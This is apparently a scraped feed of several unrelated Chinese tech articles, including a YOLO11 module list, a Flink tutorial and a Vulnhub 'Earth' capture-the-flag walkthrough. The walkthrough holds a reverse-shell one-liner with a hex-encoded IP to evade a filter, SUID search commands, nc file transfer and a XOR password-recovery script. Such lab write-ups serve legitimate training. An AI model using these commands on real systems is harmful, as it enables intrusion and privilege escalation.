使用C3k2-Faster替换C3k2.(使用FasterNet中的FasterBlock替换C3k2中的Bottleneck)
ultralytics/cfg/models/11/yolo11-C3k2-ODConv.yaml
使用C3k2-ODConv替换C3k2.(使用ODConv替换C3k2中的Bottleneck中的Conv)
ultralytics/cfg/models/11/yolo11-C3k2-ODConv.yaml
使用C3k2-ODConv替换C3k2.(使用ODConv替换C3k2中的Bottleneck中的Conv)
ultralytics/cfg/models/11/yolo11-C3k2-Faster-EMA.yaml
使用C3k2-Faster-EMA替换C3k2.(C3k2-Faster-EMA推荐可以放在主干上,Neck和head部分可以选择C3k2-Faster)
ultralytics/cfg/models/11/yolo11-C3k2-DBB.yaml
使用C3k2-DBB替换C3k2.(使用DiverseBranchBlock替换C3k2中的Bottleneck中的Conv)
ultralytics/cfg/models/11/yolo11-C3k2-CloAtt.yaml
使用C3k2-CloAtt替换C3k2.(使用CloFormer中的具有全局和局部特征的注意力机制添加到C3k2中的Bottleneck中)(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-C3k2-SCConv.yaml
SCConv(CVPR2020 http://mftp.mmcheng.net/Papers/20cvprSCNet.pdf)与C3k2融合.
ultralytics/cfg/models/11/yolo11-C3k2-SCcConv.yaml
ScConv(CVPR2023 https://openaccess.thecvf.com/content/CVPR2023/papers/Li_SCConv_Spatial_and_Channel_Reconstruction_Convolution_for_Feature_Redundancy_CVPR_2023_paper.pdf)与C3k2融合.
(取名为SCcConv的原因是在windows下命名是不区分大小写的)
ultralytics/cfg/models/11/yolo11-KernelWarehouse.yaml
使用Towards Parameter-Efficient Dynamic Convolution添加到yolo11中.
使用此模块需要注意,在epoch0-20的时候精度会非常低,过了20epoch会正常.
ultralytics/cfg/models/11/yolo11-C3k2-DySnakeConv.yaml
DySnakeConv与C3k2融合.
ultralytics/cfg/models/11/yolo11-C3k2-DCNV2.yaml
使用C3k2-DCNV2替换C3k2.(DCNV2为可变形卷积V2)
ultralytics/cfg/models/11/yolo11-C3k2-DCNV3.yaml
使用C3k2-DCNV3替换C3k2.(DCNV3为可变形卷积V3(CVPR2023,众多排行榜的SOTA))
官方中包含了一些指定版本的DCNV3 whl包,下载后直接pip install xxx即可.具体和安装DCNV3可看百度云链接中的视频.
ultralytics/cfg/models/11/yolo11-C3k2-OREPA.yaml
使用C3k2-OREPA替换C3k2.Online Convolutional Re-parameterization (CVPR2022)
ultralytics/cfg/models/11/yolo11-C3k2-REPVGGOREPA.yaml
使用C3k2-REPVGGOREPA替换C3k2.Online Convolutional Re-parameterization (CVPR2022)
ultralytics/cfg/models/11/yolo11-C3k2-DCNV4.yaml
使用DCNV4改进C3k2.(请关闭AMP进行训练,使用教程请看20240116版本更新说明)
ultralytics/cfg/models/11/yolo11-C3k2-ContextGuided.yaml
使用CGNet中的Light-weight Context Guided改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-MSBlock.yaml
使用YOLO-MS中的MSBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-DLKA.yaml
使用deformableLKA改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-DAttention.yaml
使用Vision Transformer with Deformable Attention(CVPR2022)改进C3k2.(需要看常见错误和解决方案的第五点)
使用注意点请看百度云视频.(DAttention(Vision Transformer with Deformable Attention CVPR2022)使用注意说明.)
使用ParC-Net中的ParC_Operator改进C3k2.(需要看常见错误和解决方案的第五点)
使用注意点请看百度云视频.(20231031更新说明)
ultralytics/cfg/models/11/yolo11-C3k2-DWR.yaml
使用DWRSeg中的Dilation-wise Residual(DWR)模块,加强从网络高层的可扩展感受野中提取特征.
ultralytics/cfg/models/11/yolo11-C3k2-RFAConv.yaml
使用RFAConv中的RFAConv改进yolo11.
ultralytics/cfg/models/11/yolo11-C3k2-RFCBAMConv.yaml
使用RFAConv中的RFCBAMConv改进yolo11.
ultralytics/cfg/models/11/yolo11-C3k2-RFCAConv.yaml
使用RFAConv中的RFCAConv改进yolo11.
ultralytics/cfg/models/11/yolo11-C3k2-FocusedLinearAttention.yaml
使用FLatten Transformer(ICCV2023)中的FocusedLinearAttention改进C3k2.(需要看常见错误和解决方案的第五点)
使用注意点请看百度云视频.(20231114版本更新说明.)
ultralytics/cfg/models/11/yolo11-C3k2-MLCA.yaml
使用Mixed Local Channel Attention 2023改进C3k2.(用法请看百度云视频-20231129版本更新说明)
ultralytics/cfg/models/11/yolo11-C3k2-AKConv.yaml
使用AKConv 2023改进C3k2.(用法请看百度云视频-20231129版本更新说明)
ultralytics/cfg/models/11/yolo11-C3k2-UniRepLKNetBlock.yaml
使用UniRepLKNet中的UniRepLKNetBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-DRB.yaml
使用UniRepLKNet中的DilatedReparamBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-AggregatedAtt.yaml
使用TransNeXt中的聚合感知注意力改进C3k2.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-C3k2-SWC.yaml
使用shift-wise conv改进yolo11中的C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-iRMB.yaml
使用EMO ICCV2023中的iRMB改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-VSS.yaml
使用最新的Mamba架构Mamba-UNet中的VSS对C3k2中的BottleNeck进行改进,使其能更有效地捕获图像中的复杂细节和更广泛的语义上下文.
ultralytics/cfg/models/11/yolo11-C3k2-LVMB.yaml
使用最新的Mamba架构Mamba-UNet中的VSS与Cross Stage Partial进行结合,使其能更有效地捕获图像中的复杂细节和更广泛的语义上下文.
ultralytics/cfg/models/11/yolo11-RepNCSPELAN.yaml
使用YOLOV9中的RepNCSPELAN进行改进yolo11.
ultralytics/cfg/models/11/yolo11-C3k2-DynamicConv.yaml
使用CVPR2024 parameternet中的DynamicConv改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-GhostDynamicConv.yaml
使用CVPR2024 parameternet中的GhostModule改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-RVB.yaml
使用CVPR2024 RepViT中的RepViTBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-DGCST.yaml
使用Lightweight Object Detection中的Dynamic Group Convolution Shuffle Transformer改进yolo11.
ultralytics/cfg/models/11/yolo11-C3k2-RetBlock.yaml
使用CVPR2024 RMT中的RetBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-PKI.yaml
使用CVPR2024 PKINet中的PKIModule和CAA模块改进C3k2.
ultralytics/cfg/models/11/yolo11-RepNCSPELAN_CAA.yaml
使用CVPR2024 PKINet中的CAA模块改进RepNCSPELAN.
ultralytics/cfg/models/11/yolo11-C3k2-fadc.yaml
使用CVPR2024 Frequency-Adaptive Dilated Convolution改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-PPA.yaml
使用HCFNet中的Parallelized Patch-Aware Attention Module改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-Star.yaml
使用StarNet CVPR2024中的StarBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-KAN.yaml
KAN In! Mamba Out! Kolmogorov-Arnold Networks.
目前支持:
FastKANConv2DLayer
KANConv2DLayer
KALNConv2DLayer
KACNConv2DLayer
KAGNConv2DLayer
ultralytics/cfg/models/11/yolo11-C3k2-DEConv.yaml
使用DEA-Net中的detail-enhanced convolution改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-Heat.yaml
使用vHeat中的HeatBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-WTConv.yaml
使用ECCV2024 Wavelet Convolutions for Large Receptive Fields中的WTConv改进C3k2-BottleNeck.
ultralytics/cfg/models/11/yolo11-C3k2-FMB.yaml
使用ECCV2024 SMFANet的Feature Modulation block改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-gConv.yaml
使用Rethinking Performance Gains in Image Dehazing Networks的gConvblock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-WDBB.yaml
使用YOLO-MIF中的WDBB改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-DeepDBB.yaml
使用YOLO-MIF中的DeepDBB改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-AdditiveBlock.yaml
使用CAS-ViT中的AdditiveBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-MogaBlock.yaml
使用MogaNet ICLR2024中的MogaBlock改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-IdentityFormer.yaml
使用Metaformer TPAMI2024中的IdentityFormer改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-RandomMixing.yaml
使用Metaformer TPAMI2024中的RandomMixingFormer改进C3k2.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-C3k2-PoolingFormer.yaml
使用Metaformer TPAMI2024中的PoolingFormer改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-ConvFormer.yaml
使用Metaformer TPAMI2024中的ConvFormer改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-CaFormer.yaml
使用Metaformer TPAMI2024中的CaFormer改进C3k2.
组合系列
ultralytics/cfg/models/11/yolo11-fasternet-bifpn.yaml
fasternet与bifpn的结合.
其中BIFPN中有三个可选参数：
Fusion
其中BIFPN中的Fusion模块支持五种: weight, adaptive, concat, bifpn(default), SDI
其中weight, adaptive, concat出自paper链接-Figure 3, SDI出自U-NetV2
node_mode
其中目前(后续会更新喔)支持这些结构
head_channel
BIFPN中的通道数,默认设置为256.
ultralytics/cfg/models/11/yolo11-ELA-HSFPN-TADDH.yaml
使用Efficient Local Attention改进HSFPN,使用自研动态动态对齐检测头改进Head.
ultralytics/cfg/models/11/yolo11-FDPN-TADDH.yaml
自研结构的融合.
自研特征聚焦扩散金字塔网络(Focusing Diffusion Pyramid Network)
自研任务对齐动态检测头(Task Align Dynamic Detection Head)
ultralytics/cfg/models/11/yolo11-starnet-C3k2-Star-LSCD.yaml
轻量化模型组合.
CVPR2024-StarNet Backbone.
C3k2-Star.
Lightweight Shared Convolutional Detection Head.
Mamba-YOLO
Mamba-YOLO
集成Mamba-YOLO.(需要编译请看百度云视频-20240619版本更新说明)
ultralytics/cfg/models/mamba-yolo/Mamba-YOLO-T.yaml
ultralytics/cfg/models/mamba-yolo/Mamba-YOLO-B.yaml
ultralytics/cfg/models/mamba-yolo/Mamba-YOLO-L.yaml
ultralytics/cfg/models/mamba-yolo/yolo-mamba-seg.yaml
注意力系列
EMA
SimAM
SpatialGroupEnhance
BiLevelRoutingAttention, BiLevelRoutingAttention_nchw
TripletAttention
CoordAtt
CBAM
BAMBlock
EfficientAttention(CloFormer中的注意力)
LSKBlock
SEAttention
CPCA
deformable_LKA
EffectiveSEModule
LSKA
SegNext_Attention
DAttention(Vision Transformer with Deformable Attention CVPR2022)
FocusedLinearAttention(ICCV2023)
MLCA
TransNeXt_AggregatedAttention
LocalWindowAttention(EfficientViT中的CascadedGroupAttention注意力)
Efficient Local AttentionEfficient Local Attention
CAA(CVPR2024 PKINet中的注意力)
CAFM
AFGCAttentionNeural Networks ECCV2024
Loss系列
SlideLoss,EMASlideLoss.(可动态调节正负样本的系数,让模型更加注重难分类,错误分类的样本上)
IoU,GIoU,DIoU,CIoU,EIoU,SIoU,MPDIoU,ShapeIoU.
Inner-IoU,Inner-GIoU,Inner-DIoU,Inner-CIoU,Inner-EIoU,Inner-SIoU,Inner-ShapeIoU.
Wise-IoU(v1,v2,v3)系列(IoU,WIoU,EIoU,GIoU,DIoU,CIoU,SIoU,MPDIoU,ShapeIoU).
Inner-Wise-IoU(v1,v2,v3)系列(IoU,WIoU,EIoU,GIoU,DIoU,CIoU,SIoU,MPDIoU,ShapeIoU).
FocalLoss,VarifocalLoss,QualityfocalLoss
Focaler-IoU系列(IoU,GIoU,DIoU,CIoU,EIoU,SIoU,WIoU,MPDIoU,ShapeIoU)
Powerful-IoU,Powerful-IoUV2,Inner-Powerful-IoU,Inner-Powerful-IoUV2,Focaler-Powerful-IoU,Focaler-Powerful-IoUV2,Wise-Powerful-IoU(v1,v2,v3),Wise-Powerful-IoUV2(v1,v2,v3)论文链接
Normalized Gaussian Wasserstein Distance.
更新公告
20241013-yolov11-v1.1
初版发布。
20241018-yolov11-v1.2
移植完200+改进点。
修复已知问题。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540134.html</guid><pubDate>Fri, 31 Oct 2025 07:25:29 +0000</pubDate></item><item><title>Vulnhub打靶-The Plants:Earth</title><link>https://www.ppmy.cn/news/1540135.html</link><description>基本信息
靶机下载：
https://download.vulnhub.com/theplanets/Earth.ova
攻击机器：192.168.20.128（Windows操作系统）
靶机：192.168.20.0/24
目标：获取2个flag+root权限
基本步骤
信息收集
我们将靶机开启，首先使用nmap探活，查看主机精确IP，如下所示
我们靶机的IP为
192.168.20.140
，开放
80、443、22
端口，首先使用浏览器访问
80
端口，发现显示结果如下
显示400BadRequest，就很疑惑，尝试使用443https协议访问也是有问题的，我们上网找一下这方面的相关解释
大概率是因为我们不能直接通过IP访问，需要找到其正确的URL地址，我们使用nmap进行更详细的信息探测，使用命令如下
nmap -O -sV -p- -A 192.168.20.140
我们发现关键信息，给了DNS解析地址，即
earth.local
和
terratest.earth.local
，我们在host文件中加入对应的解析地址，如下所示
在浏览器中我们直接使用域名进行访问，如下所示
漏洞初探
我去试了试他界面给的那几串字符串，但是没发现任何有用的信息，所以还是先进行目录扫描吧，看看能不能有啥信息出现
我们发现存在登录界面，我们尝试访问，看看有没有什么信息
这个登陆框抓包了，但是没有任何有用的信息，sql注入用sqlmap跑了，现实的是没有注入漏洞，应该是其token值进行了限制，所以我们这里试着像上一篇文章一样，试着去看看有没有php后门或者txt文件泄露了相关的信息，相关命令如下所示
gobuster dir -u http://earth.local/ -x php,txt,jsp,asp -w "C:\Users\Administrator\Desktop\目录字典\directory-list-2.3-medium.txt"
但是结果是啥都没扫出来，就当我非常绝望的时候，我想起来还有一个域名，而且肯定会在某个备份文件中有信息告诉我们前面的信息是如何进行加密的，所以我们试着去扫一扫另外一个域名下是否有相关信息，结果还真的扫出来了
我们去看看这个robots.txt写了什么
最后一个告诉了我们一个
testingnotes.*
的文件，我们猜测是txt文件或者php文件，我们都尝试一下
我们翻译过来就是下面这句话
告诉了我们如下几条信息
1.使用XOR加密
2.加密文件为testdata.txt
3.用户名为terra
我们访问testdata.txt文件，相关信息如下
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
脚本代码如下所示：
import
binasciic
=
"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"
m
=
"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."
m_new
=
binascii
.
b2a_hex
(
m
.
encode
(
"utf-8"
)
)
result
=
hex
(
int
(
c
,
16
)
^
int
(
m_new
,
16
)
)
print
(
result
)
这里解密出来的十六进制数据再拿去转成字符串，得到如下结果
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
这里面都是重复的字符串，所以我们猜测用户名为
terra
，密码为
earthclimatechangebad4humans
我们成功登录进去，发现有一个命令执行框，这下可以快乐的执行反弹shell了
反弹shell
我们首先试试能不能直接任意命令执行，我们先随便试一试相关命令
直接开始反弹shell，这里就不过多赘述
我们发现这里禁止了远程连接，但是我们又是必须要获取shell权限的，不然后面的权限提升没办法做，我们首先看看这个网站下这个页面的源代码，看看能不能有什么发现，在找的过程中顺带发现了第一个flag
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
我们这里发现了这串代码对我们的反弹shell语句进行了过滤，仔细分析一下是对我们的IP地址进行了正则匹配，所以我们只需要将我们的IP地址转成十六进制即可
/bin/bash -i &gt;&amp; /dev/tcp/0xC0A81480/9001 0&gt;&amp;1
反弹shell成功，接下来进行提权即可
权限提升
我们这里试着使用suid提权，SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限，我们首先搜索符合条件的可以提权的程序
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -user root -perm -4000 -print 2&gt;/dev/null
####三种命令都可以
但是这里面并没有我们常见的用来提权的几种程序，但是有一个
reset_root
非常的奇怪，我们试着直接运行这个程序
发现失败了，这里我们只能将其传回本地分析了，使用nc可以传回来，我也是第一次遇见，所以这里稍微写详细一点
首先我们在kali攻击机上开一个接收端口，如下所示
nc -l 4444 &gt; reset_root
再通过nc将靶机上的文件传输过去
nc 192.168.20.138 &lt; /usr/bin/reset_root
我们传到靶机上后通过strace命令对其进行分析，分析结果如下所示
应该是因为没有这几个文件才导致我们的文件无法正常运行，所以我们只需要创建这几个文件就可以了
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
成功执行，root用户密码是Earth，我们登录即可
第二个flag也成功找到
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
总结
异或脚本编写
反弹shell绕过
suid提权
nc进行文件传输
strace进行文件分析</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540135.html</guid><pubDate>Fri, 31 Oct 2025 07:25:31 +0000</pubDate></item><item><title>【开发语言】快来看看不同编程语言输出语句，感受一下编程多样性的魅力吧 ！！</title><link>https://www.ppmy.cn/news/1540136.html</link><description>编程语言的多样性是编程世界的一个迷人之处。每种语言都设计有其独特的语法、特性和用途，以适应不同的开发需求、平台和环境。你提到的这些输出语句（或函数），尽管它们的功能相似——即在控制台或终端中显示文本——但它们各自代表了不同编程语言和生态系统的风格与哲学。
**Python 的
print
**： Python 的
print
函数是最直观和易用的输出方式之一。它不仅可以输出字符串，还可以轻松地输出变量、表达式的结果，甚至多个项目（通过逗号分隔），并且提供了格式化输出的选项（通过
format
方法或 f-strings）。
python
print("Hello, World!")
x = 10
print(f"The value of x is {x}.")
**C/C++ 的
printf
**：
printf
是 C 和 C++ 中用于格式化输出的标准库函数，它提供了极高的灵活性来控制输出的格式。虽然使用起来可能比 Python 的
print
更复杂一些，但它允许开发者精确控制输出文本的布局和格式。
c
#include &lt;stdio.h&gt;
int main() {
int x = 10;
printf("The value of x is %d.\n", x);
return 0;
}
**C++ 的
cout
**： C++ 的
cout
是标准库中的一个输出流对象，用于向标准输出设备（通常是控制台）发送数据。与
printf
相比，
cout
使用更接近于自然语言的语法，并且支持重载运算符，使其能够输出不同类型的数据。
cpp
#include &lt;iostream&gt;
using namespace std;
int main() {
int x = 10;
cout &lt;&lt; "The value of x is " &lt;&lt; x &lt;&lt; "." &lt;&lt; endl;
return 0;
}
**Java 的
System.out.println
**： Java 使用
System.out.println
方法来输出带有换行符的字符串。这是 Java 程序中常见的输出方式，虽然它不如 Python 的
print
或 C++ 的
cout
那样灵活，但它仍然是 Java 生态系统中的标准做法。
java
public class Main {
public static void main(String[] args) {
int x = 10;
System.out.println("The value of x is " + x + ".");
}
}
**JavaScript 的
console.log
**： 在 Web 开发中，JavaScript 的
console.log
是开发者最常用的调试工具之一。它允许开发者在浏览器的控制台中输出信息，这对于调试和跟踪代码的执行流程非常有帮助。
javascript
let x = 10;
console.log(`The value of x is ${x}.`);
**C# 的
Console.WriteLine
**： C# 中的
Console.WriteLine
方法与 Java 的
System.out.println
类似，用于向控制台输出一行文本。C# 是 Microsoft 开发的一种面向对象的编程语言，广泛应用于 Windows 应用程序、Web 应用程序和游戏开发中。
csharp
using System;
class Program
{
static void Main()
{
int x = 10;
Console.WriteLine($"The value of x is {x}.");
}
}
每种语言都有其特定的语法和库，但它们的共同之处在于提供了与用户或其他系统组件交互的基本方式。这种多样性使得编程世界充满了创新和可能性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540136.html</guid><pubDate>Fri, 31 Oct 2025 07:25:33 +0000</pubDate></item><item><title>Flink简介及小案例</title><link>https://www.ppmy.cn/news/1540137.html</link><description>Apache Flink 是一个用于分布式数据流处理的框架，常用于实时大数据处理和批处理。Flink 的操作可以分为两个方面：
安装配置
和
编写任务代码
。下面对这两块做一下简单的介绍。
1. 安装和配置 Flink
(1) 下载并安装 Flink
从 Apache Flink 的官网上下载对应的二进制包 Flink 下载页面。
# 使用wget下载
wget
https://downloads.apache.org/flink/flink-1.14.4/flink-1.14.4-bin-scala_2.12.tgz
# 解压
tar
-xzf flink-1.14.4-bin-scala_2.12.tgz
cd
flink-1.14.4
(2) 配置 Flink
配置文件路径：
conf/flink-conf.yaml
可修改的参数：
jobmanager.rpc.address
: 设置为 JobManager 的主机名或 IP 地址。
taskmanager.numberOfTaskSlots
: 每个 TaskManager 可以配置的 slot 数量。
(3) 启动 Flink 集群
Flink 可以本地运行，也可以运行在分布式集群上。下面展示在本地启动 Flink 的命令：
# 启动 Flink 集群
./bin/start-cluster.sh
启动后可以通过浏览器访问
localhost:8081
来查看 Flink Web UI，查看作业状态和集群信息。
2. 编写 Flink 任务代码
Flink 任务主要分为两类：
DataStream API
（用于流处理）和
DataSet API
（用于批处理）。这里我们主要介绍流处理。
(1) 设置开发环境
通常我们使用 Java 或 Scala 编写 Flink 应用。在 Maven 项目中，可以通过添加以下依赖来集成 Flink：
&lt;
dependency
&gt;
&lt;
groupId
&gt;
org.apache.flink
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
flink-streaming-java_2.12
&lt;/
artifactId
&gt;
&lt;
version
&gt;
1.14.4
&lt;/
version
&gt;
&lt;/
dependency
&gt;
(2) 示例代码
一个简单的流处理任务的 Java 代码如下：
import
org
.
apache
.
flink
.
streaming
.
api
.
environment
.
StreamExecutionEnvironment
;
public
class
FlinkExample
{
public
static
void
main
(
String
[
]
args
)
throws
Exception
{
// 创建执行环境
final
StreamExecutionEnvironment
env
=
StreamExecutionEnvironment
.
getExecutionEnvironment
(
)
;
// 生成数据源
DataStream
&lt;
String
&gt;
text
=
env
.
fromElements
(
"hello"
,
"world"
,
"flink"
,
"streaming"
)
;
// 进行简单的转换操作，如 map
DataStream
&lt;
String
&gt;
upperCaseStream
=
text
.
map
(
String
::
toUpperCase
)
;
// 打印结果到控制台
upperCaseStream
.
print
(
)
;
// 启动程序
env
.
execute
(
"Flink Streaming Example"
)
;
}
}
(3) 提交任务
当任务编写完成后，可以通过以下命令将任务提交到 Flink 集群：
# 提交任务到 Flink 集群
./bin/flink run -c
&lt;
MainClass
&gt;
&lt;
JAR文件路径
&gt;
例如：
./bin/flink run -c com.example.FlinkExample /path/to/flink-example.jar
3. 常用操作
Flink 提供了很多常用操作用于流数据处理：
map()
: 对流中的每个元素应用一个函数。
filter()
: 过滤掉不符合条件的元素。
keyBy()
: 基于某个字段对流进行分组。
window()
: 对流数据进行窗口化处理（如基于时间窗口或数量窗口）。
reduce()
: 聚合操作，对窗口中的数据进行累积处理。
这些操作组合起来可以实现复杂的实时数据处理逻辑。
总结
Flink 的操作主要包括集群的搭建与配置，以及通过 API 编写数据处理任务。安装和启动相对简单，而任务的实现可以根据需求组合不同的算子来实现复杂的处理逻辑。如果你有具体的任务需求或想了解某些细节，我可以为你提供更详细的帮助。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540137.html</guid><pubDate>Fri, 31 Oct 2025 07:25:36 +0000</pubDate></item><item><title>GB/T 42706.1,2,3,4,5,6,7,8,9 -2023 电子元器件 半导体器件长期贮存 1~9文件，IEC 62435 中文版</title><link>https://www.ppmy.cn/news/1540138.html</link><description>GBT 42706.1-2023 电子元器件 半导体器件长期贮存 第1部分：总则（IEC 62435-1 中文）
GBT 42706.2-2023 电子元器件半导体器件长期贮存第2部分退化机理（IEC 62435-2 中文）
GBT 42706.3 电子元器件 半导体器件的长期贮存 第3部分：数据 （IEC 62435-3 中文）
GBT 42706.4 电子元器件 半导体器件长期贮存 第4部分：贮存 （IEC 62435-4 中文）
GBT 42706.5-2023 电子元器件-第5部分：芯片和晶圆 （IEC 62435-5_2017 中文）
GBT 42706.6 电子元器件 半导体器件长期贮存 第6部分：封装或涂覆元器件（IEC 62435-6 中文）
GBT 42706.7 电子元器件 半导体器件长期贮存 第7部分：微电子机械器件（IEC 62435-7 中文）
GBT 42706.8 电子元器件 半导体器件长期贮存 第8部分：无源电子器件（IEC 62435-8 中文）
GBT 42706.9 电子元器件 半导体器件长期贮存 第9部分：特殊情况（IEC 62435-9 中文）
IEC 62435-2023 中文 第1~9部分打包  电子元器件 半导体器件长期贮存GBT 42706-2023 下载</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540138.html</guid><pubDate>Fri, 31 Oct 2025 07:25:39 +0000</pubDate></item><item><title>无人机之声学识别技术篇</title><link>https://www.ppmy.cn/news/1540139.html</link><description>一、声学识别技术的原理
无人机在飞行过程中，其电机工作、旋翼震动以及气流扰动等都会产生一定程度的噪声。这些噪声具有独特的声学特征，如频率范围、时域和频域特性等，可以用于无人机的检测与识别。声学识别技术主要通过以下步骤实现：
声音信号采集：
利用麦克风阵列等声学传感器收集环境中的声音信号。麦克风阵列的形式可以有线性四阵列、球形阵列等，它们能够捕捉到来自不同方向的声音信号。
信号预处理：
对采集到的声音信号进行去噪、增强等预处理操作，以提高声音信号的质量。
特征提取：
从预处理后的声音信号中提取出能够反映无人机声学特征的参数，如声音的频谱、功率谱、梅尔倒谱系数等。
模型匹配与识别：
将提取出的声音特征与预先建立的无人机声音样本库进行匹配，通过比对声音特征的相似度来判断是否为无人机的声音。样本库中包含了不同类型、不同型号的无人机在起飞、飞行、悬停、降落等状态下的声音样本。
二、声学识别技术的应用
无人机侦测与定位：
通过声学识别技术，可以实现对无人机的快速侦测和精确定位。这对于无人机管控、反制等领域具有重要意义。
无人机类型识别：
通过提取无人机声音信号的深层特征，利用卷积神经网络（CNN）、循环神经网络（RNN）等深度学习算法，可以对无人机进行类型识别。这对于无人机管理、监控等方面具有重要作用。
无人机声音预警：
当外界传入的声音信号被判断为无人机声音时，声学识别系统可以进行预警，提醒相关人员注意并采取相应措施。
三、声学识别技术的挑战与前景
挑战：
噪声环境下的识别准确性：在复杂噪声环境下，如何准确识别无人机的声音是一个难题。
不同类型无人机的声音特征差异：不同型号、不同类型的无人机声音特征存在差异，这增加了识别的难度。
前景：
技术优化：随着机器学习、深度学习等技术的不断发展，声学识别算法的准确性和鲁棒性将不断提高。
多模态识别：将声学识别技术与其他生物识别技术（如人脸识别、指纹识别）相结合，形成多模态识别技术，可以提高识别的准确性和可靠性。
跨领域应用：声学识别技术不仅在无人机领域具有广泛应用前景，还可以拓展到智能安防、智能家居等领域。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540139.html</guid><pubDate>Fri, 31 Oct 2025 07:25:42 +0000</pubDate></item><item><title>uniapp获取底部导航tabbar的高度（H5）</title><link>https://www.ppmy.cn/news/1540140.html</link><description>uniapp获取底部导航tabbar的高度（H5）
&lt;
view
:
style
=
"'bottom:' + tabBarHeight + 'px;'"
&gt;
&lt;
/
view
&gt;
tabBarHeight
:
0
,
// 底部tabBar高度， h5
// #ifdef H5
getTabBarHeight
(
)
{
const
systemInfo
=
uni
.
getSystemInfoSync
(
)
this
.
tabBarHeight
=
systemInfo
.
windowBottom
}
,
// #endif</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540140.html</guid><pubDate>Fri, 31 Oct 2025 07:25:43 +0000</pubDate></item><item><title>基于SSM的实验室考勤管理系统【附源码】</title><link>https://www.ppmy.cn/news/1540141.html</link><description>基于SSM的实验室考勤管理系统
（源码+L文+说明文档）
目录
4 系统设计
4.1 系统概要设计
4.2 系统功能结构设计
4.3 数据库设计
4.3.1 数据库E-R图设计
4.3.2 数据库表结构设计
5 系统实现
5.1学生信息管理
5.2 教师信息管理
5.3实验室管理
5.1公告信息管理
4.1 系统概要设计
4.2 系统功能结构设计
4.3 数据库设计
4.3.1 数据库E-R图设计
4.3.2 数据库表结构设计
5 系统实现
5.1学生信息管理
5.2 教师信息管理
5.3实验室管理
5.1公告信息管理
4.1 系统概要设计
4.2 系统功能结构设计
4.3 数据库设计
4.3.1 数据库E-R图设计
4.3.2 数据库表结构设计
5 系统实现
5.1学生信息管理
5.2 教师信息管理
5.3实验室管理
5.1公告信息管理
4 系统设计
